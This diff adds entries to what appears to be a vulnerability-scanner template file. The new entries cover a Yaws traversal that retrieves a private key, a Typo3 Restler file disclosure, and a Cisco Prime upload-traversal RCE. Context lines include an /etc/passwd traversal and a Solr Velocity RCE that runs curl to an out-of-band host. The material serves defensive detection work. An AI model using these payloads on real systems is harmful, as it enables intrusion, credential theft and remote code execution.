@@ -11523,6 +11523,57 @@
       ]
     },
     {
+      "id": "CVE-2017-10974",
+      "info": {
+        "author": "0x_Akoko",
+        "classification": {
+          "cve-id": "CVE-2017-10974",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "cvss-score": 7.5,
+          "cwe-id": "CWE-22"
+        },
+        "description": "Yaws 1.91 allows Unauthenticated Remote File Disclosure via HTTP Directory Traversal with /%5C../ to port 8080",
+        "name": "Yaws 1.91 - Remote File Disclosure",
+        "reference": [
+          "https://www.exploit-db.com/exploits/42303",
+          "https://nvd.nist.gov/vuln/detail/CVE-2017-10974"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2017,yaws,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "BEGIN RSA PRIVATE KEY"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "or",
+              "dsl": [
+                "!contains(tolower(body), \"<html\")",
+                "!contains(tolower(body), \"<HTML\")"
+              ],
+              "type": "dsl"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/%5C../ssl/yaws-key.pem"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2017-11444",
       "info": {
         "author": "dwisiswant0",
@@ -12182,6 +12233,55 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/static/../../../a/../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2017-15363",
+      "info": {
+        "author": "0x_Akoko",
+        "classification": {
+          "cve-id": "CVE-2017-15363",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "cvss-score": 7.5,
+          "cwe-id": "CWE-98"
+        },
+        "description": "Directory traversal vulnerability in public/examples/resources/getsource.php in Luracast Restler through 3.0.0, as used in the restler extension before 1.7.1 for TYPO3, allows remote attackers to read arbitrary files via the file parameter.",
+        "name": "Typo3 Restler Extension - Local File Disclosure",
+        "reference": [
+          "https://www.exploit-db.com/exploits/42985",
+          "https://www.cvedetails.com/cve/CVE-2017-15363"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2017,restler,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<?php",
+                "'host'",
+                "'database'",
+                "'extConf'",
+                "'debug'"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/typo3conf/ext/restler/vendor/luracast/restler/public/examples/resources/getsource.php?file=../../../../../../../LocalConfiguration.php"
           ]
         }
       ]
@@ -20324,6 +20424,49 @@
             "POST /solr/{{core}}/config HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n    \"update-queryresponsewriter\": {\n      \"startup\": \"lazy\",\n      \"name\": \"velocity\",\n      \"class\": \"solr.VelocityResponseWriter\",\n      \"template.base.dir\": \"\",\n      \"solr.resource.loader.enabled\": \"true\",\n      \"params.resource.loader.enabled\": \"true\"\n    }\n}\n",
             "GET /solr/{{core}}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27curl%20http://{{interactsh-url}}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1\nHost: {{Hostname}}\nConnection: close\n"
           ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-1821",
+      "info": {
+        "author": "_0xf4n9x_",
+        "classification": {
+          "cve-id": "CVE-2019-1821",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvss-score": 9.8,
+          "cwe-id": "CWE-20"
+        },
+        "description": "Cisco Prime Infrastructure Health Monitor HA TarArchive Directory Traversal Remote Code Execution Vulnerability.",
+        "metadata": {
+          "shodan-query": "http.title:\"prime infrastructure\""
+        },
+        "name": "Cisco Prime Infrastructure Unauthorized RCE (CVE-2019-1821)",
+        "reference": [
+          "https://srcincite.io/blog/2019/05/17/panic-at-the-cisco-unauthenticated-rce-in-prime-infrastructure.html",
+          "https://nvd.nist.gov/vuln/detail/CVE-2019-1821",
+          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1821"
+        ],
+        "severity": "critical",
+        "tags": "rce,fileupload,unauth,cve,cve2019"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "dsl": [
+                "status_code==200",
+                "contains((body_2), '{{randstr}}')"
+              ],
+              "type": "dsl"
+            }
+          ],
+          "raw": [
+            "POST /servlet/UploadServlet HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nAccept-Encoding: gzip, deflate\nAccept: */*\nPrimary-IP: 127.0.0.1\nFilename: test.tar\nFilesize: 10240\nCompressed-Archive: false\nDestination-Dir: tftpRoot\nFilecount: 1\nContent-Length: 269\nContent-Type: multipart/form-data; boundary=871a4a346a547cf05cb83f57b9ebcb83\n\n--871a4a346a547cf05cb83f57b9ebcb83\nContent-Disposition: form-data; name=\"files\"; filename=\"test.tar\"\n\n../../opt/CSCOlumos/tomcat/webapps/ROOT/test.txt0000644000000000000000000000000400000000000017431 0ustar  00000000000000{{randstr}}\n--871a4a346a547cf05cb83f57b9ebcb83--\n",
+            "GET /test.txt HTTP/1.1\nHost: {{Host}}\nConnection: close\nAccept-Encoding: gzip, deflate\nAccept: */*\n"
+          ],
+          "req-condition": true
         }
       ]
     },
